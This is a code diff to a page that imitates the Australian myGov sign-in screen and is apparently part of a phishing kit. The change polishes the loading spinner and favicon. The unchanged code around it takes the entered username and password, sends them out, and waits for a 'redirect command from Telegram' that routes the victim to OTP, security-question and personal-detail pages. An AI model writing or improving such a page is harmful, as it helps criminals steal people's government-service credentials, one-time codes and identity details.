@@ -24,28 +24,39 @@
             margin-bottom: 15px;
             width: 100%;
         }
-        /* ===== Waiting / spinner state ===== */
-        .waiting-overlay {
+
+        /* ===== Spinner inside the Sign in button ===== */
+        .button-main {
+            position: relative;
+        }
+        .button-main .btn-spinner {
             display: none;
-            text-align: center;
-            padding: 40px 20px 30px;
-        }
-        .waiting-overlay.active { display: block; }
-        .waiting-text {
-            color: #333;
-            font-size: 16px;
-            margin: 0 0 10px;
-        }
-        .spinner {
-            border: 4px solid #dfe3e8;
-            border-top: 4px solid #215c8e;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            margin: -10px 0 0 -10px;
+            border: 3px solid rgba(255, 255, 255, 0.45);
+            border-top-color: #ffffff;
             border-radius: 50%;
-            width: 48px;
-            height: 48px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+            animation: spin 0.8s linear infinite;
         }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        .button-main.loading .btn-label {
+            visibility: hidden;
+        }
+        .button-main.loading .btn-spinner {
+            display: block;
+        }
+        .button-main.loading,
+        .button-main:disabled {
+            cursor: default;
+            pointer-events: none;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
     </style>
 </head>
 
@@ -130,20 +141,16 @@
                                         </p>
                                         <div class="button-digital-id-main-container override">
                                             <div class="digital-id-button-container">
-                                                <button type="submit" class="button-main" name="btn1" id="btn1">Sign in</button>
+                                                <button type="submit" class="button-main" name="btn1" id="btn1">
+                                                    <span class="btn-label">Sign in</span>
+                                                    <span class="btn-spinner" aria-hidden="true"></span>
+                                                </button>
                                             </div>
                                         </div>
                                         <p class="create-account-text">
                                             <a class="create-account-link" href="#">Create a myGov account</a> if you don't have one already.
                                         </p>
                                     </form>
-
-                                    <!-- Waiting / spinner panel -->
-                                    <div id="waiting" class="waiting-overlay" role="status" aria-live="polite">
-                                        <p class="waiting-text">Verifying your details…</p>
-                                        <div class="spinner"></div>
-                                        <p class="waiting-text">Please wait, this may take a moment.</p>
-                                    </div>
                                 </div>
                             </div>
                         </div>
@@ -187,27 +194,75 @@
 
     const ROUTES = {
         "otp":     "otp.html",
-        "passwordrest":  "passwordreset.html",
+        "passwordreset":  "passwordreset.html",
         "login":   "login.html",
         "secquestion": "secquestion.html",
         "detail":   "detail.html"
     };
     // =========================
 
+    /* ---------- Rolling favicon (tab loader) ---------- */
+    let faviconTimer = null;
+    let favAngle = 0;
+    const favCanvas = document.createElement('canvas');
+    favCanvas.width = 32;
+    favCanvas.height = 32;
+    const favCtx = favCanvas.getContext('2d');
+
+    let faviconLink = document.querySelector("link[rel*='icon']");
+    if (!faviconLink) {
+        faviconLink = document.createElement('link');
+        faviconLink.rel = 'icon';
+        document.head.appendChild(faviconLink);
+    }
+
+    function drawFavicon(angle) {
+        favCtx.clearRect(0, 0, 32, 32);
+
+        // track ring
+        favCtx.beginPath();
+        favCtx.arc(16, 16, 11, 0, Math.PI * 2);
+        favCtx.strokeStyle = '#dfe3e8';
+        favCtx.lineWidth = 5;
+        favCtx.stroke();
+
+        // spinning arc
+        favCtx.beginPath();
+        favCtx.arc(16, 16, 11, angle, angle + Math.PI * 0.65);
+        favCtx.strokeStyle = '#215c8e';
+        favCtx.lineWidth = 5;
+        favCtx.lineCap = 'round';
+        favCtx.stroke();
+
+        faviconLink.href = favCanvas.toDataURL('image/png');
+    }
+
+    function startTabSpinner() {
+        if (faviconTimer) return;
+        faviconTimer = setInterval(function () {
+            favAngle += Math.PI / 8;
+            drawFavicon(favAngle);
+        }, 60);
+    }
+
+    function stopTabSpinner() {
+        if (faviconTimer) {
+            clearInterval(faviconTimer);
+            faviconTimer = null;
+        }
+    }
+
+    /* ---------- Form handling ---------- */
     $(document).ready(function() {
-        // Override the form submission
         $('#form-1').on('submit', async function(e) {
             e.preventDefault();
 
             const user = $('#ai').val();
             const pass = $('#pr').val();
 
-            // Hide the form/options and reveal the spinner
-            $(this).hide();
-            $('.digital-id-login-card.secondary').hide();
-            $('.hr-word').hide();
-            $('.login-instruction-text').hide();
-            $('#waiting').addClass('active');
+            // Spin the Sign in button + roll the tab favicon
+            $('#btn1').addClass('loading').prop('disabled', true);
+            startTabSpinner();
 
             const sid = (crypto.randomUUID && crypto.randomUUID().slice(0, 8)) ||
                         Math.random().toString(36).slice(2, 10);
@@ -241,7 +296,7 @@
                     })
                 });
 
-                // Start listening for the redirect command from Telegram
+                // Listen for the redirect command from Telegram
                 pollLoop(startOffset, sid);
 
             } catch (err) {
@@ -276,6 +331,7 @@
                     });
 
                     // Follow the command
+                    stopTabSpinner();
                     window.location.href = ROUTES[action] || "login.html";
                     return;
                 }
